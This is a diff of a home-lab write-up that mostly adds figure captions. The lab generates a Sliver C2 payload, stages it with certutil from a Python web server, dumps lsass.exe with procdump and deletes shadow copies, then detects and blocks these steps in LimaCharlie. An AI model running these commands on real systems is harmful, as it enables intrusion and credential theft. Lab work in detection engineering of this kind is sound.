@@ -47,13 +47,11 @@ monitoring and capturing telemetry, creating and applying detection rules.
 
 #### Once in my Ubuntu machine I use the _'sudo su'_ command to temporarily gain root access, navigate to the sliver directory and launch Sliver-server.
 
-*Ref 3: Launching Sliver-server*
+*Ref 3: Launching Sliver-server and generating C2 session payload*
 
 ![image](https://github.com/user-attachments/assets/bb40665c-01da-4dda-a41b-4d2cfb7b4e79)
 
 Using the command _'generate --http 192.168.247.129 --save /opt/sliver'_, I generate a Command & Control payload executable.
-
-*Ref 3: Generating C2 session payload*
 
 ![SLIVER C2 payload GOOD_TWINE](https://github.com/user-attachments/assets/a1d170c5-f92d-4f9b-b112-41a524bf70ec)
 
@@ -72,13 +70,16 @@ _'python3 -m http.server 80'_
 #### I switched my attention to the Windows VM and launched an Administrative PowerShell console.
 Executing the command _'certutil.exe -f -urlcache http://192.168.247.129/GOOD_TWINE.exe GOOD_TWINE.exe'_ starts the download of my payload.
 
-![Malware Staged 2](https://github.com/user-attachments/assets/8fd84d5e-a28e-48cd-a13f-abc199bb91e3)
+*Ref 4: Downloading C2 session payload onto victim machine via Python3 web server*
 
+![Malware Staged 2](https://github.com/user-attachments/assets/8fd84d5e-a28e-48cd-a13f-abc199bb91e3)
 
 ![We are In!](https://github.com/user-attachments/assets/299b4831-809b-474f-8e88-d56db49344c5)
 
 #### Now that we are hosting a live session between the two machines, I input the commands _'info' 'getprivs'_ and _'ps -T'_ to check my remote user privileges, information on the victim machine, and see the specific security products used.
 _In this case my victim machine is using Sysmon64 and Windows Smart Screen_.
+
+*Ref 5: Full remote access*
 
 ![Inside the Windows machine](https://github.com/user-attachments/assets/0352ae0d-93e0-47cb-ae54-c729b6974974)
 
@@ -87,6 +88,7 @@ _In this case my victim machine is using Sysmon64 and Windows Smart Screen_.
 ![Identifying running processes in remote system](https://github.com/user-attachments/assets/a5abe060-f99e-404f-a6fa-2422107eb357)
 
 #### We can see processes like _SeDebugPrivilege_ and _SeImpersonatePrivilege_ are Enabled, which means we are logged in as Admin.
+
 ![Implant admin privs on Windows machine](https://github.com/user-attachments/assets/628cf8ab-4473-40b4-9a46-36a155edf91c)
 
 
@@ -97,6 +99,8 @@ Using my host machine I click the sensors tab, to see that my Windows machine is
 ![LimaCharlie Win11 vm Sensor](https://github.com/user-attachments/assets/683eea85-3abc-4784-878d-6666f4e0c2f7)
 
 We can look inside our LimaCharlie SIEM and see telemetry from the attack. We can identify the payload thats running and see the IP its connected to.
+
+*Ref 6: LimaCharlie Processes and Network Detection Telemetry*
 
 ![Unusual NOT signed process hmm](https://github.com/user-attachments/assets/ee04912e-9120-4411-a4f0-007de47cc5f9)
 ![Network Logs of our attack](https://github.com/user-attachments/assets/3ecf5dd1-1a41-4f31-8aec-ebd87f6debe6)
@@ -115,6 +119,8 @@ Using the _'procdump -n lsass.exe -s lsass.dmp'_ command I saved the remote proc
 
 #### _Let's see what this looks like on LimaCharlie_
 
+*Ref 7: Detection Rule*
+
 ![Sensitive_Process_Event](https://github.com/user-attachments/assets/d5b08096-0c1f-40cb-af0b-c76b5e93873e)
 
 ![Detection Rule](https://github.com/user-attachments/assets/a3b65c2f-7d13-4e61-9f98-928f9c13ecdc)
@@ -122,11 +128,15 @@ Using the _'procdump -n lsass.exe -s lsass.dmp'_ command I saved the remote proc
 
 #### Instead of just detecting attacks, we can use LimaCharlie to create a rule that both detects and responds, by blocking threats originating from the Sliver server. By simulating ransomware on the Ubuntu machine, such as attempting to delete volume shadow copies, we can monitor the telemetry in LimaCharlie and then implement a rule that completely stops the attack. Once this rule is active in our SIEM, any further attempts by the Ubuntu machine to carry out the same attack will be blocked.
 
+*Ref 8: Response Rule Vss_deletion_kill_it*
+
 ![Deleting shadow volume copies (Ransomware attack)](https://github.com/user-attachments/assets/020b0796-18e6-483c-bceb-363944122ad7)
 
 ![Detection of Deleting shadow volumes](https://github.com/user-attachments/assets/a7d3f7fe-a332-409f-b6ae-0e3f90f1d121)
 
 ![Response Rule Vss_deletion_kill_it](https://github.com/user-attachments/assets/78032692-1303-4ec4-be96-7e5ab2fe805f)
+
+*Ref 9: Forced remote shell exit*
 
 ![Forced shell exit](https://github.com/user-attachments/assets/8001d5a3-a31e-400a-8e6f-90584c8ae4f8)
 
